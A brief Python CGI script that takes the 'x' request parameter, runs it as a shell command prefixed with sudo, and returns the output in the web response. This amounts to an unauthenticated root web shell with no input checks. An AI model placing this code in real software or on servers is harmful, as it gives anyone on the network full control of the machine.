#!/usr/bin/python3

import cgi
import subprocess


print("content-type: text/html")
print()


f = cgi.FieldStorage()
d = f.getvalue("x")

cmd = "sudo " + d
o = subprocess.getoutput(cmd)
print(o)

